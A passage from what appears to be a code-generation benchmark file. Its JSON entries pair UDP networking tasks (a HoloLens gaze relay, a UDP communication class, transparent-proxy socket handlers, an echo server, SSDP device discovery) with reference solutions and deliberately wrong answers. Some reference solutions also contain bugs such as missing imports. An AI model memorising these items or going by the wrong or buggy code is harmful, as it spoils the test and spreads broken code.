    "Canonical_solution": "import socket\nimport zmq\nimport zmq_tools\nfrom pyre import zhelper\n\nclass Hololens_Relay:\n    def __init__(self, zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\"):\n        self.context = zmq_ctx\n        self.thread_pipe = zhelper.zthread_fork(self.context, self.thread_loop)\n        self.host = host\n        self.port = port\n        self.ipc_push_url = ipc_push_url\n        self.ipc_sub_url = ipc_sub_url\n        self.start_server(f\"{host}:{port}\")\n\n    def start_server(self, new_address):\n        self.thread_pipe.send_string(\"Bind\", flags=zmq.SNDMORE)\n        self.thread_pipe.send_string(new_address)\n        response = self.thread_pipe.recv_string()\n        msg = self.thread_pipe.recv_string()\n        if response == \"Bind OK\":\n            host, port = msg.split(\":\")\n            self.host = host\n            self.port = port\n            return True\n        return False\n\n    def stop_server(self):\n        self.thread_pipe.send_string(\"Exit\")\n        while self.thread_pipe:\n            pass\n\n    def thread_loop(self, context, pipe):\n        poller = zmq.Poller()\n        ipc_pub = zmq_tools.Msg_Dispatcher(context, self.ipc_push_url)\n        ipc_sub = zmq_tools.Msg_Receiver(\n            context,\n            self.ipc_sub_url,\n            (\"gaze\", \"notify.calibration.failed\", \"notify.calibration.successful\"),\n        )\n        poller.register(pipe, zmq.POLLIN)\n        poller.register(ipc_sub.socket, zmq.POLLIN)\n        remote_socket = None\n        self.gaze_receiver = None\n        self.calib_result_receiver = None\n\n        while True:\n            items = [sock for sock, _ in poller.poll()]\n            if pipe in items:\n                cmd = pipe.recv_string()\n                if cmd == \"Exit\":\n                    break\n                elif cmd == \"Bind\":\n                    new_url = pipe.recv_string()\n                    if remote_socket:\n                        poller.unregister(remote_socket)\n                        remote_socket.close()\n                    try:\n                        remote_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n                        remote_socket.setblocking(False)\n                        addr, port = new_url.split(\":\")\n                        socket_addr = (addr, int(port))\n                        remote_socket.bind(socket_addr)\n                    except OSError:\n                        remote_socket = None\n                        pipe.send_string(\"Error\", flags=zmq.SNDMORE)\n                        pipe.send_string(f\"Could not bind to Socket: {new_url}\")\n                    else:\n                        pipe.send_string(\"Bind OK\", flags=zmq.SNDMORE)\n                        pipe.send_string(new_url)\n                        poller.register(remote_socket, zmq.POLLIN)\n\n            if remote_socket and remote_socket.fileno() in items:\n                self.on_recv(remote_socket, ipc_pub)\n\n            if ipc_sub.socket in items:\n                while ipc_sub.new_data:\n                    topic, payload = ipc_sub.recv()\n                    if self.gaze_receiver and remote_socket and topic.startswith(\"gaze\"):\n                        method, eye = payload[\"topic\"].split(\".\")[1:3]\n                        if method == \"2d\":\n                            data = b\"EG%s%s%s\" % (\n                                method[:1].encode(),\n                                eye.encode(),\n                                struct.pack(\"ff\", *payload[\"norm_pos\"]),\n                            )\n                        elif method == \"3d\":\n                            data = b\"EG%s%s%s\" % (\n                                method[:1].encode(),\n                                eye.encode(),\n                                struct.pack(\"fff\", *payload[\"gaze_point_3d\"]),\n                            )\n                        remote_socket.sendto(data, self.gaze_receiver)\n\n                    elif (self.calib_result_receiver and remote_socket and \n                          topic.startswith(\"notify.calibration.\")):\n                        if payload[\"subject\"] == \"calibration.successful\":\n                            remote_socket.sendto(b\"ECS\", self.calib_result_receiver)\n                            self.calib_result_receiver = None\n                        elif payload[\"subject\"] == \"calibration.failed\":\n                            remote_socket.sendto(b\"ECF\", self.calib_result_receiver)\n                            self.calib_result_receiver = None\n\n        if remote_socket:\n            remote_socket.close()\n\n    def on_recv(self, socket, ipc_pub):\n        try:\n            byte_msg, sender = socket.recvfrom(2048)\n        except OSError:\n            return\n\n        if byte_msg[:1] == b\"R\":\n            try:\n                ipc_pub.socket.send_string(\"notify.calibration.add_ref_data\", flags=zmq.SNDMORE)\n                ipc_pub.socket.send(byte_msg[1:])\n                response = b\"0R\"\n            except Exception as e:\n                response = b\"FRReference point mal-formatted or missing: %s\" % str(e).encode()\n        elif byte_msg[:1] == b\"S\":\n            self.gaze_receiver = sender\n            response = b\"0S\"\n        elif byte_msg[:1] == b\"s\":\n            self.gaze_receiver = None\n            response = b\"0s\"\n        elif byte_msg[:1] == b\"I\":\n            mode = byte_msg[1:2]\n            init_2d = mode == b\"2\"\n            calib_method = \"HMD_Calibration\" if init_2d else \"HMD_Calibration_3D\"\n            ipc_pub.notify({\"subject\": \"start_plugin\", \"name\": calib_method})\n            response = b\"0I\"\n        elif byte_msg[:1] == b\"i\":\n            response = b\"0i\"\n        elif byte_msg[:1] == b\"C\":\n            self.calib_result_receiver = sender\n            response = b\"0C\"\n        elif byte_msg[:1] == b\"c\":\n            response = b\"0c\"\n        elif byte_msg[:1] == b\"T\":\n            try:\n                target = struct.unpack(\"f\", byte_msg[1:])[0]\n                response = b\"0T\"\n            except Exception:\n                response = b\"FT'%s' cannot be converted to float.\" % (byte_msg[1])\n        elif byte_msg[:1] == b\"V\":\n            response = b\"0V%s\" % bytes(__version__)\n        else:\n            response = b'FFUnknown command. \"%s\"' % byte_msg\n\n        socket.sendto(response, sender)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "import socket\nimport zmq\n\nclass Hololens_Relay:\n    def __init__(self, zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\"):\n        self.context = zmq_ctx\n        self.thread_pipe = self.context.socket(zmq.PUSH)\n        self.host = host\n        self.port = port\n        self.ipc_push_url = ipc_push_url\n        self.ipc_sub_url = ipc_sub_url\n        self.gaze_receiver = None\n        self.calib_result_receiver = None\n        self.udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.udp_socket.bind((self.host, int(self.port)))\n        self.sub_socket = self.context.socket(zmq.SUB)\n        self.sub_socket.connect(self.ipc_sub_url)\n        self.sub_socket.setsockopt(zmq.SUBSCRIBE, b'')\n        self.pub_socket = self.context.socket(zmq.PUB)\n        self.pub_socket.bind(self.ipc_push_url)\n\n    def start_server(self, new_address):\n        try:\n            host, port = new_address.split(':')\n            self.udp_socket.bind((host, int(port)))\n            return True\n        except Exception as e:\n            print(f\"Error binding UDP socket: {e}\")\n            return False\n\n    def stop_server(self):\n        self.udp_socket.close()\n        self.sub_socket.close()\n        self.pub_socket.close()\n\n    def thread_loop(self, context, pipe):\n        poller = zmq.Poller()\n        poller.register(self.sub_socket, zmq.POLLIN)\n        poller.register(self.udp_socket, zmq.POLLIN)\n        while True:\n            socks = poller.poll()\n            for sock, _ in socks:\n                if sock == self.sub_socket:\n                    msg = self.sub_socket.recv()\n                    self.on_recv(self.udp_socket, self.pub_socket, msg)\n                elif sock == self.udp_socket:\n                    data, addr = self.udp_socket.recvfrom(65535)\n                    self.on_recv(self.udp_socket, self.pub_socket, data, addr)\n\n    def on_recv(self, socket, ipc_pub, data, addr=None):\n        ipc_pub.send(data)"
  },
  {
    "Task_id": 424,
    "Instruction": "Task Description: Implement a UDP communication class that handles socket creation, data transmission, and reception with proper connection management and error handling.\n\nClass Description: The UDPCommunication class provides functionality for UDP-based network communication, including opening/closing connections, sending/receiving data, and managing connection status. It uses threading for asynchronous data reception and includes signal-based notification for connection status changes.\n\nAttributes:\n- conn: [socket.socket] - The UDP socket object used for communication\n- status: [ConnectionStatus] - Current connection status (CONNECTED/CLOSED)\n- config: [dict] - Configuration dictionary containing protocol, port, and target information\n- onConnectionStatus: [pyqtSignal] - Signal emitted when connection status changes\n- hintSignal: [pyqtSignal] - Signal for displaying error messages or hints\n- receiveProcess: [threading.Thread] - Thread handling incoming data reception\n\nMethods:\n- __init__() -> None - Initializes the UDP communication object with default configuration\n- openCloseSerial() -> None - Toggles connection state (opens if closed, closes if open)\n- receiveDataProcess(conn: socket.socket) -> None - Thread function for receiving data (private method)\n- send(data: bytes) -> None - Sends data to configured target\n- checkTarget(target: str) -> tuple - Validates and parses target address into (host, port) tuple\n- isConnected() -> bool - Returns current connection status\n- getConnStatus() -> ConnectionStatus - Returns current connection status object",
    "Canonical_solution": "from PyQt5.QtCore import pyqtSignal, QObject\nimport socket\nimport threading\nimport time\nimport re\n\nclass UDPCommunication:\n    def __init__(self):\n        self.conn = None\n        self.status = ConnectionStatus.CLOSED\n        self.config = {\n            \"protocol\": \"udp\",\n            \"port\": 2345,\n            \"target\": [\"127.0.0.1:2345\", [\"127.0.0.1:2345\"]]\n        }\n        self.onConnectionStatus = pyqtSignal(ConnectionStatus, str)\n        self.hintSignal = pyqtSignal(str, str, str)\n\n    def openCloseSerial(self):\n        if self.status == ConnectionStatus.CLOSED:\n            try:\n                self.conn = socket.socket(type=socket.SOCK_DGRAM)\n                self.conn.bind((\"0.0.0.0\", self.config[\"port\"]))\n                self.status = ConnectionStatus.CONNECTED\n                self.receiveProcess = threading.Thread(target=self.receiveDataProcess, args=(self.conn,))\n                self.receiveProcess.setDaemon(True)\n                self.receiveProcess.start()\n                self.onConnectionStatus.emit(self.status, \"\")\n            except Exception as e:\n                msg = _(\"Connect Failed\") + \"\\n\" + str(e)\n                self.hintSignal.emit(\"error\", _(\"Error\"), msg)\n                self.status = ConnectionStatus.CLOSED\n                self.onConnectionStatus.emit(self.status, msg)\n        else:\n            self.status = ConnectionStatus.CLOSED\n            if self.conn:\n                self.conn.close()\n                self.conn = None\n            self.onConnectionStatus.emit(self.status, \"\")\n\n    def receiveDataProcess(self, conn):\n        buffer = b''\n        t = 0\n        conn.settimeout(0.1)\n        while self.status != ConnectionStatus.CLOSED:\n            try:\n                data, target = conn.recvfrom(4096)\n                if data:\n                    if len(data) > 4096:\n                        flush = False\n                    t = time.time()\n                    buffer += data\n                    if buffer and (time.time() - t > 0.001):\n                        try:\n                            if buffer:\n                                self.onReceived(buffer)\n                        except Exception as e:\n                            print(\"-- error in onReceived callback:\", e)\n                        buffer = b''\n            except socket.timeout:\n                continue\n            except Exception as e:\n                print(\"-- recv error:\", e)\n                self.status = ConnectionStatus.CLOSED\n                self.onConnectionStatus.emit(self.status, _(\"Connection closed!\") + \" \" + str(e))\n                try:\n                    conn.close()\n                except Exception:\n                    pass\n                break\n\n    def send(self, data: bytes):\n        if self.conn and self.status == ConnectionStatus.CONNECTED:\n            target = self.checkTarget(self.config[\"target\"][0])\n            if not target:\n                self.hintSignal.emit(\"error\", _(\"Target error\"), _(\"Target error\") + \": \" + self.config[\"target\"])\n            self.conn.sendto(data, target)\n\n    def checkTarget(self, target):\n        if not target:\n            return None\n        host = target\n        port = 80\n        target = target.replace(\"\uff1a\", \":\")\n        if target.endswith(\":\"):\n            target = target[:-1]\n        _host = re.match('http(.*)://(.*)', target)\n        if _host:\n            s, target = _host.groups()\n            host = target\n        _host = re.match('(.*):(\\d*)', target)\n        if _host:\n            host, port = _host.groups()\n            port = int(port)\n        if host.endswith(\"/\"):\n            host = host[:-1]\n        return (host, port)\n\n    def isConnected(self):\n        return self.status == ConnectionStatus.CONNECTED\n\n    def getConnStatus(self):\n        return self.status",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "import socket\nimport threading\nfrom PyQt5.QtCore import QObject, pyqtSignal\n\nclass ConnectionStatus:\n    CLOSED = 0\n    CONNECTED = 1\n\nclass UDPCommunication(QObject):\n    onConnectionStatus = pyqtSignal(int)\n    hintSignal = pyqtSignal(str)\n\n    def __init__(self):\n        super().__init__()\n        self.conn = None\n        self.status = ConnectionStatus.CLOSED\n        self.config = {\n            'protocol': 'udp',\n            'port': 12345,\n            'target': 'localhost:12345'\n        }\n        self.stop_flag = False\n        self.receiveProcess = threading.Thread(target=self.receiveDataProcess)\n\n    def openCloseSerial(self):\n        if self.status == ConnectionStatus.CLOSED:\n            self._open()\n        else:\n            self._close()\n\n    def _open(self):\n        self.conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.conn.bind(('', self.config['port']))\n        self.status = ConnectionStatus.CONNECTED\n        self.onConnectionStatus.emit(self.status)\n        self.receiveProcess = threading.Thread(target=self.receiveDataProcess)\n        self.receiveProcess.start()\n\n    def _close(self):\n        if self.conn:\n            self.conn.close()\n            self.status = ConnectionStatus.CLOSED\n            self.onConnectionStatus.emit(self.status)\n            self.stop_flag = True\n            self.receiveProcess.join()\n\n    def receiveDataProcess(self):\n        while not self.stop_flag:\n            try:\n                data, addr = self.conn.recvfrom(1024)\n                self.hintSignal.emit(f\"Received: {data.decode()}\")\n            except Exception as e:\n                self.hintSignal.emit(f\"Error: {str(e)}\")\n\n    def send(self, data: bytes):\n        host, port = self.checkTarget(self.config['target'])\n        if host and port:\n            self.conn.sendto(data, (host, port))\n        else:\n            self.hintSignal.emit(\"Invalid target\")\n\n    def checkTarget(self, target: str) -> tuple:\n        parts = target.split(':')\n        if len(parts) != 2:\n            return (None, None)\n        host = parts[0]\n        try:\n            port = int(parts[1])\n        except ValueError:\n            return (None, None)\n        return (host, port)\n\n    def isConnected(self) -> bool:\n        return self.status == ConnectionStatus.CONNECTED\n\n    def getConnStatus(self) -> int:\n        return self.status"
  },
  {
    "Task_id": 425,
    "Instruction": "Task Description: Implement a UDP socket handler class that facilitates UDP communication with advanced features like receiving destination address information and binding to any available interface.\n\nClass Description: The UDPSocketHandler class provides methods for setting up UDP listeners, receiving UDP packets with ancillary data (including destination address), and sending UDP packets with specific source binding. It's designed for scenarios where you need detailed control over UDP communication, such as when implementing network proxies or specialized UDP services.\n\nAttributes:\n[Note: The reference implementation doesn't show any instance attributes, but uses class-level constants]\nIP_BINDANY: [int] - Socket option constant for binding to any available interface\nIP_RECVDSTADDR: [int] - Socket option constant for receiving destination address information\n\nMethods:\nMethod1: recv_udp(listener: socket.socket, bufsize: int) -> tuple - Receives UDP data along with source and destination address information\n  Parameters:\n    - listener: The UDP socket to receive data from\n    - bufsize: Maximum amount of data to receive\n  Returns:\n    - tuple: (srcip, dstip, data) where:\n      srcip: Source address (IP, port)\n      dstip: Destination address (IP, port) or None\n      data: Received data\n\nMethod2: send_udp(sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None - Sends UDP data with specific source binding\n  Parameters:\n    - sock: The original socket (used for family information)\n    - srcip: Source address (IP, port) to bind to\n    - dstip: Destination address (IP, port) to send to\n    - data: Data to send\n  Returns: None\n\nMethod3: setup_udp_listener(udp_listener: object) -> None - Configures a UDP listener socket to receive destination address information\n  Parameters:\n    - udp_listener: An object containing v4 and/or v6 socket instances\n  Returns: None",
    "Canonical_solution": "import socket\nimport subprocess as ssubprocess\nfrom sshuttle.helpers import debug1, debug3, Fatal\n\nIP_BINDANY = 24\nIP_RECVDSTADDR = 7\n\nclass UDPSocketHandler:\n    def __init__(self):\n        pass\n\n    def recv_udp(self, listener, bufsize):\n        debug3('Accept UDP python using recvmsg.')\n        data, ancdata, _, srcip = listener.recvmsg(4096,\n                                                  socket.CMSG_SPACE(4))\n        dstip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_RECVDSTADDR:\n                port = 53\n                ip = socket.inet_ntop(socket.AF_INET, cmsg_data[0:4])\n                dstip = (ip, port)\n                break\n        return (srcip, dstip, data)\n\n    def send_udp(self, sock, srcip, dstip, data):\n        if not srcip:\n            debug1(\n               \"-- ignored UDP to %r: \"\n               \"couldn't determine source IP address\" % (dstip,))\n            return\n\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_IP, IP_BINDANY, 1)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener):\n        if udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(socket.SOL_IP, IP_RECVDSTADDR, 1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "import socket\nimport struct\n\nclass UDPSocketHandler:\n    IP_BINDANY = socket.SO_REUSEADDR\n    IP_RECVDSTADDR = socket.SO_REUSEADDR\n\n    @staticmethod\n    def recv_udp(listener, bufsize):\n        listener.setsockopt(socket.SOL_IP, UDPSocketHandler.IP_RECVDSTADDR, 1)\n        msg, ancdata, flags, addr = listener.recvmsg(bufsize, 1)\n        dst_ip = None\n        for cmsg in ancdata:\n            if cmsg[0] == socket.SOL_IP and cmsg[1] == UDPSocketHandler.IP_RECVDSTADDR:\n                buf = cmsg[2]\n                family, port, ip = struct.unpack('!HHI', buf[:8])\n                if family == socket.AF_INET:\n                    ip_str = socket.inet_ntoa(struct.pack('!I', ip))\n                    port_str = socket.ntohs(port)\n                    dst_ip = (ip_str, port_str)\n        return (addr, dst_ip, msg)\n\n    @staticmethod\n    def send_udp(sock, srcip, dstip, data):\n        sock.bind(srcip)\n        sock.sendto(data, dstip)\n\n    @staticmethod\n    def setup_udp_listener(udp_listener):\n        for sock in [udp_listener.v4, udp_listener.v6]:\n            if sock:\n                sock.setsockopt(socket.SOL_SOCKET, UDPSocketHandler.IP_BINDANY, 1)\n                sock.setsockopt(socket.SOL_IP, UDPSocketHandler.IP_RECVDSTADDR, 1)"
  },
  {
    "Task_id": 429,
    "Instruction": "Task Description: Implement a UDP socket handler class that facilitates UDP communication with support for IP transparent proxying and original destination address retrieval.\n\nClass Description: The UDPSocketHandler class provides methods for receiving and sending UDP packets while maintaining information about both source and destination addresses. It supports both IPv4 and IPv6 protocols and includes special handling for transparent proxying scenarios.\n\nAttributes:\n[No explicit attributes are defined in the class, as it primarily operates through its methods]\n\nMethods:\n\nMethod1: recv_udp(listener: socket.socket, bufsize: int) -> tuple - Receives UDP packets and extracts both source and destination address information. Uses recvmsg() to get ancillary data containing the original destination address.\n  Input:\n    - listener: A bound UDP socket object\n    - bufsize: Maximum buffer size for received data\n  Output:\n    - tuple: (srcip: tuple, dstip: tuple, data: bytes) containing source address, destination address, and received data\n\nMethod2: send_udp(sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None - Sends UDP packets while maintaining source address information through IP transparent option.\n  Input:\n    - sock: The socket to use for sending\n    - srcip: Source address tuple (IP, port)\n    - dstip: Destination address tuple (IP, port)\n    - data: The data to send\n  Output: None\n\nMethod3: setup_udp_listener(udp_listener: object) -> None - Configures UDP listener sockets for transparent proxying and original destination address retrieval.\n  Input:\n    - udp_listener: An object containing v4 and v6 socket instances\n  Output: None\n\nMethod4: setsockopt_error(e: Exception) -> None - Handles permission errors related to socket options and raises a fatal error.\n  Input:\n    - e: The caught PermissionError exception\n  Output: None (raises Fatal exception)",
    "Canonical_solution": "import socket\nimport os\nimport struct\nfrom sshuttle.helpers import debug1, debug3, Fatal\n\nIP_TRANSPARENT = 19\nIP_ORIGDSTADDR = 20\nIP_RECVORIGDSTADDR = IP_ORIGDSTADDR\nSOL_IPV6 = 41\nIPV6_ORIGDSTADDR = 74\nIPV6_RECVORIGDSTADDR = IPV6_ORIGDSTADDR\n\nclass UDPSocketHandler:\n    def __init__(self):\n        pass\n\n    def recv_udp(self, listener, bufsize):\n        debug3('Accept UDP python using recvmsg.')\n        data, ancdata, _, srcip = listener.recvmsg(\n            4096, socket.CMSG_SPACE(24))\n        dstip = None\n        family = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == IP_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET:\n                    start = 4\n                    length = 4\n                else:\n                    raise Fatal(\"Unsupported socket type '%s'\" % family)\n                ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                dstip = (ip, port)\n                break\n            elif cmsg_level == SOL_IPV6 and cmsg_type == IPV6_ORIGDSTADDR:\n                family, port = struct.unpack('=HH', cmsg_data[0:4])\n                port = socket.htons(port)\n                if family == socket.AF_INET6:\n                    start = 8\n                    length = 16\n                else:\n                    raise Fatal(\"Unsupported socket type '%s'\" % family)\n                ip = socket.inet_ntop(family, cmsg_data[start:start + length])\n                dstip = (ip, port)\n                break\n        return (srcip, dstip, data)\n\n    def send_udp(self, sock, srcip, dstip, data):\n        if not srcip:\n            debug1(\n                \"-- ignored UDP to %r: \"\n                \"couldn't determine source IP address\\n\" % (dstip,))\n            return\n        sender = socket.socket(sock.family, socket.SOCK_DGRAM)\n        sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        try:\n            sender.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        except PermissionError as e:\n            self.setsockopt_error(e)\n        sender.bind(srcip)\n        sender.sendto(data, dstip)\n        sender.close()\n\n    def setup_udp_listener(self, udp_listener):\n        try:\n            udp_listener.setsockopt(socket.SOL_IP, IP_TRANSPARENT, 1)\n        except PermissionError as e:\n            self.setsockopt_error(e)\n\n        if udp_listener.v4 is not None:\n            udp_listener.v4.setsockopt(\n                socket.SOL_IP, IP_RECVORIGDSTADDR, 1)\n        if udp_listener.v6 is not None:\n            udp_listener.v6.setsockopt(SOL_IPV6, IPV6_RECVORIGDSTADDR, 1)\n\n    def setsockopt_error(self, e):\n        raise Fatal(\"Insufficient permissions for tproxy method.\\n\"\n                   \"Your effective UID is %d, not 0. Try rerunning as root.\\n\"\n                   % os.geteuid())",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
    "wrong_result": "import socket\n\nclass UDPSocketHandler:\n    def recv_udp(self, listener: socket.socket, bufsize: int) -> tuple:\n        data, ancdata, src_addr = listener.recvmsg(bufsize, 0)\n        src_ip = src_addr\n        dst_ip = None\n        for cmsg_level, cmsg_type, cmsg_data in ancdata:\n            if cmsg_level == socket.SOL_IP and cmsg_type == socket.SO_ORIGINAL_DST:\n                if len(cmsg_data) >= 16:\n                    family = (cmsg_data[0] << 8) | cmsg_data[1]\n                    if family == socket.AF_INET:\n                        ip_bytes = cmsg_data[2:6]\n                        ip_str = socket.inet_ntoa(ip_bytes)\n                        port = (cmsg_data[6] << 8) | cmsg_data[7]\n                        dst_ip = (ip_str, port)\n                    elif family == socket.AF_INET6:\n                        ip_str = socket.inet_ntop(socket.AF_INET6, cmsg_data[2:18])\n                        port = (cmsg_data[18] << 8) | cmsg_data[19]\n                        dst_ip = (ip_str, port)\n        return (src_ip, dst_ip, data)\n\n    def send_udp(self, sock: socket.socket, srcip: tuple, dstip: tuple, data: bytes) -> None:\n        sock.bind(srcip)\n        sock.sendto(data, dstip)\n\n    def setup_udp_listener(self, udp_listener: object) -> None:\n        for sock in udp_listener.v4_socket, udp_listener.v6_socket:\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            try:\n                sock.setsockopt(socket.SOL_IP, socket.IP_TRANSPARENT, 1)\n            except AttributeError:\n                pass\n            try:\n                sock.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_LOOP, 0)\n            except AttributeError:\n                pass\n\n    def setsockopt_error(self, e: Exception) -> None:\n        raise RuntimeError(f\"Fatal error: {e}\")"
  },
  {
    "Task_id": 430,
    "Instruction": "Task Description: Implement a UDP echo server that receives data from clients and sends the same data back to the client.\n\nFunction Description: The function `udp_echo_server` creates a UDP socket, binds it to a specified host and port, and continuously listens for incoming data. When data is received, it echoes the same data back to the sender. The function runs indefinitely until manually stopped.\n\nInput:  \n- `host` (str, optional): The local IP address to bind the socket to. Defaults to 'localhost'.  \n- `port` (int, optional): The port number to bind the socket to. Defaults to 6789.  \n\nOutput: None (The function runs indefinitely and does not return any value.)",
    "Canonical_solution": "from socket import *\n\ndef udp_echo_server(host='localhost', port=6789):\n    server = socket(AF_INET, SOCK_DGRAM)\n    server.bind((host, port))\n    while True:\n        data, addr = server.recvfrom(1024)\n        server.sendto(data, addr)\n    server.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 71,
    "wrong_result": "import socket\n\ndef udp_echo_server(host='localhost', port=6789):\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    s.bind((host, port))\n    while True:\n        data, addr = s.recvfrom(65535)\n        s.sendto(data, addr)"
  },
  {
    "Task_id": 431,
    "Instruction": "Task Description: Implement a class for discovering devices on a network using SSDP (Simple Service Discovery Protocol) over UDP multicast. The class should be able to send discovery requests and handle responses from devices.\n\nClass Description: The SSDPDiscover class is responsible for discovering UPnP/DLNA devices on a local network using SSDP. It sends M-SEARCH requests to a multicast address and listens for responses. The class supports both single-socket and multi-socket modes for sending discovery requests.\n\nAttributes:\n- SSDP_ADDRESS: [str] - The multicast address for SSDP (239.255.255.250)\n- SSDP_PORT: [int] - The port number for SSDP (1900)\n- SSDP_MX: [int] - The maximum wait time for responses (in seconds)\n- SSDP_TTL: [int] - The time-to-live for multicast packets\n- SSDP_AMOUNT: [int] - The number of discovery requests to send\n- MSEARCH_PORT: [int] - The local port to bind to for sending discovery requests (0 for random)\n- MSEARCH_MSG: [str] - The M-SEARCH request message template\n- BUFFER_SIZE: [int] - The size of the buffer for receiving responses\n- USE_SINGLE_SOCKET: [bool] - Whether to use a single socket for all requests or one per interface\n- cb_on_device_response: [callable] - Callback function to handle device responses\n- host: [str] - The host address to bind to (None for all interfaces)\n- addresses: [list] - List of local IPv4 addresses\n\nMethods:\n- __init__(cb_on_device_response, host=None) -> [None] - Initializes the SSDPDiscover instance with a callback for device responses and an optional host address.\n- refresh_addresses() -> [None] - Refreshes the list of local IPv4 addresses.\n- search(ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None) -> [None] - Initiates the device discovery process with optional parameters for TTL, MX, and request amount.\n- _search(host, ssdp_ttl, ssdp_mx, ssdp_amount) -> [None] - Internal method to perform the discovery process for a specific host.\n- _send_discover(sock, ssdp_mx) -> [None] - Internal method to send an M-SEARCH request using the provided socket.",
    "Canonical_solution": "import socket\nimport threading\nimport logging\nimport chardet\nimport traceback\nimport pulseaudio_dlna.utils.network\nimport pulseaudio_dlna.plugins.dlna.ssdp\n\nlogger = logging.getLogger('pulseaudio_dlna.discover')\n\nclass SSDPDiscover:\n    SSDP_ADDRESS = '239.255.255.250'\n    SSDP_PORT = 1900\n    SSDP_MX = 3\n    SSDP_TTL = 10\n    SSDP_AMOUNT = 5\n    MSEARCH_PORT = 0\n    MSEARCH_MSG = '\\r\\n'.join([\n        'M-SEARCH * HTTP/1.1',\n        'HOST: {host}:{port}',\n        'MAN: \"ssdp:discover\"',\n        'MX: {mx}',\n        'ST: ssdp:all',\n    ]) + '\\r\\n' * 2\n    BUFFER_SIZE = 1024\n    USE_SINGLE_SOCKET = True\n\n    def __init__(self, cb_on_device_response, host=None):\n        self.cb_on_device_response = cb_on_device_response\n        self.host = host\n        self.addresses = []\n        self.refresh_addresses()\n\n    def refresh_addresses(self):\n        self.addresses = pulseaudio_dlna.utils.network.ipv4_addresses()\n\n    def search(self, ssdp_ttl=None, ssdp_mx=None, ssdp_amount=None):\n        ssdp_mx = ssdp_mx or self.SSDP_MX\n        ssdp_ttl = ssdp_ttl or self.SSDP_TTL\n        ssdp_amount = ssdp_amount or self.SSDP_AMOUNT\n\n        if self.USE_SINGLE_SOCKET:\n            self._search(self.host or '', ssdp_ttl, ssdp_mx, ssdp_amount)\n        else:\n            if self.host:\n                self._search(self.host, ssdp_ttl, ssdp_mx, ssdp_amount)\n            else:\n                threads = []\n                for addr in self.addresses:\n                    thread = threading.Thread(\n                        target=self._search,\n                        args=[addr, ssdp_ttl, ssdp_mx, ssdp_amount])\n                    threads.append(thread)\n                try:\n                    for thread in threads:\n                        thread.start()\n                    for thread in threads:\n                        thread.join()\n                except:\n                    traceback.print_exc()\n\n    def _search(self, host, ssdp_ttl, ssdp_mx, ssdp_amount):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)\n        sock.settimeout(ssdp_mx)\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ssdp_ttl)\n        sock.bind((host, self.MSEARCH_PORT))\n\n        for i in range(1, ssdp_amount + 1):\n            t = threading.Timer(\n                float(i) / 2, self._send_discover, args=[sock, ssdp_mx])\n            t.start()\n\n        while True:\n            try:\n                header, address = sock.recvfrom(self.BUFFER_SIZE)\n                if self.cb_on_device_response:\n                    guess = chardet.detect(header)\n                    header = header.decode(guess['encoding'])\n                    header = pulseaudio_dlna.plugins.dlna.ssdp._get_header_map(header)\n                    self.cb_on_device_response(header, address)\n            except socket.timeout:\n                break\n        sock.close()\n\n    def _send_discover(self, sock, ssdp_mx):\n        msg = self.MSEARCH_MSG.format(\n            host=self.SSDP_ADDRESS, port=self.SSDP_PORT, mx=ssdp_mx)\n        if self.USE_SINGLE_SOCKET:\n            for addr in self.addresses:\n                sock.setsockopt(\n                    socket.SOL_IP, socket.IP_MULTICAST_IF,\n                    socket.inet_aton(addr))\n                sock.sendto(msg, (self.SSDP_ADDRESS, self.SSDP_PORT))\n        else:\n            sock.sendto(msg, (self.SSDP_ADDRESS, self.SSDP_PORT))",
    "Code_level": "Class-level",
    "FSMID_for_test": 71,
